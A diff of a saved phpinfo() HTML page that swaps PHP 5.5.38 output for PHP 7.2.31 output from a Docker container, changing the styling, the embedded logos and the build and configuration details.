@@ -1,87 +1,87 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml"><head>
 <style type="text/css">
-body {background-color: #ffffff; color: #000000;}
-body, td, th, h1, h2 {font-family: sans-serif;}
-pre {margin: 0px; font-family: monospace;}
-a:link {color: #000099; text-decoration: none; background-color: #ffffff;}
+body {background-color: #fff; color: #222; font-family: sans-serif;}
+pre {margin: 0; font-family: monospace;}
+a:link {color: #009; text-decoration: none; background-color: #fff;}
 a:hover {text-decoration: underline;}
-table {border-collapse: collapse;}
+table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
 .center {text-align: center;}
-.center table { margin-left: auto; margin-right: auto; text-align: left;}
-.center th { text-align: center !important; }
-td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}
+.center table {margin: 1em auto; text-align: left;}
+.center th {text-align: center !important;}
+td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
 h1 {font-size: 150%;}
 h2 {font-size: 125%;}
 .p {text-align: left;}
-.e {background-color: #ccccff; font-weight: bold; color: #000000;}
-.h {background-color: #9999cc; font-weight: bold; color: #000000;}
-.v {background-color: #cccccc; color: #000000;}
-.vr {background-color: #cccccc; text-align: right; color: #000000;}
-img {float: right; border: 0px;}
-hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}
+.e {background-color: #ccf; width: 300px; font-weight: bold;}
+.h {background-color: #99c; font-weight: bold;}
+.v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
+.v i {color: #999;}
+img {float: right; border: 0;}
+hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
 </style>
 <title>phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
 <body><div class="center">
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="h"><td>
-<a href="http://www.php.net/"><img border="0" src="data:image/gif;base64,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" alt="PHP logo" /></a><h1 class="p">PHP Version 5.5.38</h1>
+<a href="http://www.php.net/"><img border="0" src="data:image/png;base64,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" alt="PHP logo" /></a><h1 class="p">PHP Version 7.2.31</h1>
 </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
-<tr><td class="e">System </td><td class="v">Linux 13933fbfb0f9 5.10.104-linuxkit #1 SMP PREEMPT Thu Mar 17 17:05:54 UTC 2022 x86_64 </td></tr>
-<tr><td class="e">Build Date </td><td class="v">Aug 10 2016 21:02:47 </td></tr>
-<tr><td class="e">Configure Command </td><td class="v"> &#039;./configure&#039;  &#039;--with-config-file-path=/usr/local/etc/php&#039; &#039;--with-config-file-scan-dir=/usr/local/etc/php/conf.d&#039; &#039;--disable-cgi&#039; &#039;--enable-ftp&#039; &#039;--enable-mbstring&#039; &#039;--enable-mysqlnd&#039; &#039;--with-curl&#039; &#039;--with-libedit&#039; &#039;--with-openssl&#039; &#039;--with-zlib&#039; &#039;--with-apxs2&#039; </td></tr>
+</table>
+<table>
+<tr><td class="e">System </td><td class="v">Linux 2805bb2d4775 5.10.104-linuxkit #1 SMP PREEMPT Thu Mar 17 17:05:54 UTC 2022 x86_64 </td></tr>
+<tr><td class="e">Build Date </td><td class="v">May 15 2020 14:26:33 </td></tr>
+<tr><td class="e">Configure Command </td><td class="v"> &#039;./configure&#039;  &#039;--build=x86_64-linux-gnu&#039; &#039;--with-config-file-path=/usr/local/etc/php&#039; &#039;--with-config-file-scan-dir=/usr/local/etc/php/conf.d&#039; &#039;--enable-option-checking=fatal&#039; &#039;--with-mhash&#039; &#039;--enable-ftp&#039; &#039;--enable-mbstring&#039; &#039;--enable-mysqlnd&#039; &#039;--with-password-argon2&#039; &#039;--with-sodium=shared&#039; &#039;--with-pdo-sqlite=/usr&#039; &#039;--with-sqlite3=/usr&#039; &#039;--with-curl&#039; &#039;--with-libedit&#039; &#039;--with-openssl&#039; &#039;--with-zlib&#039; &#039;--with-libdir=lib/x86_64-linux-gnu&#039; &#039;--with-apxs2&#039; &#039;--disable-cgi&#039; &#039;build_alias=x86_64-linux-gnu&#039; </td></tr>
 <tr><td class="e">Server API </td><td class="v">Apache 2.0 Handler </td></tr>
 <tr><td class="e">Virtual Directory Support </td><td class="v">disabled </td></tr>
 <tr><td class="e">Configuration File (php.ini) Path </td><td class="v">/usr/local/etc/php </td></tr>
 <tr><td class="e">Loaded Configuration File </td><td class="v">(none) </td></tr>
 <tr><td class="e">Scan this dir for additional .ini files </td><td class="v">/usr/local/etc/php/conf.d </td></tr>
-<tr><td class="e">Additional .ini files parsed </td><td class="v">(none) </td></tr>
-<tr><td class="e">PHP API </td><td class="v">20121113 </td></tr>
-<tr><td class="e">PHP Extension </td><td class="v">20121212 </td></tr>
-<tr><td class="e">Zend Extension </td><td class="v">220121212 </td></tr>
-<tr><td class="e">Zend Extension Build </td><td class="v">API220121212,NTS </td></tr>
-<tr><td class="e">PHP Extension Build </td><td class="v">API20121212,NTS </td></tr>
+<tr><td class="e">Additional .ini files parsed </td><td class="v">/usr/local/etc/php/conf.d/docker-php-ext-sodium.ini
+ </td></tr>
+<tr><td class="e">PHP API </td><td class="v">20170718 </td></tr>
+<tr><td class="e">PHP Extension </td><td class="v">20170718 </td></tr>
+<tr><td class="e">Zend Extension </td><td class="v">320170718 </td></tr>
+<tr><td class="e">Zend Extension Build </td><td class="v">API320170718,NTS </td></tr>
+<tr><td class="e">PHP Extension Build </td><td class="v">API20170718,NTS </td></tr>
 <tr><td class="e">Debug Build </td><td class="v">no </td></tr>
 <tr><td class="e">Thread Safety </td><td class="v">disabled </td></tr>
-<tr><td class="e">Zend Signal Handling </td><td class="v">disabled </td></tr>
+<tr><td class="e">Zend Signal Handling </td><td class="v">enabled </td></tr>
 <tr><td class="e">Zend Memory Manager </td><td class="v">enabled </td></tr>
 <tr><td class="e">Zend Multibyte Support </td><td class="v">provided by mbstring </td></tr>
 <tr><td class="e">IPv6 Support </td><td class="v">enabled </td></tr>
 <tr><td class="e">DTrace Support </td><td class="v">disabled </td></tr>
 <tr><td class="e">Registered PHP Streams</td><td class="v">https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar</td></tr>
-<tr><td class="e">Registered Stream Socket Transports</td><td class="v">tcp, udp, unix, udg, ssl, sslv3, tls</td></tr>
+<tr><td class="e">Registered Stream Socket Transports</td><td class="v">tcp, udp, unix, udg, ssl, tls, tlsv1.0, tlsv1.1, tlsv1.2</td></tr>
 <tr><td class="e">Registered Stream Filters</td><td class="v">zlib.*, convert.iconv.*, string.rot13, string.toupper, string.tolower, string.strip_tags, convert.*, consumed, dechunk</td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr class="v"><td>
-<a href="http://www.zend.com/"><img border="0" src="data:image/gif;base64,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" alt="Zend logo" /></a>
-This program makes use of the Zend Scripting Language Engine:<br />Zend&nbsp;Engine&nbsp;v2.5.0,&nbsp;Copyright&nbsp;(c)&nbsp;1998-2015&nbsp;Zend&nbsp;Technologies<br /></td></tr>
-</table><br />
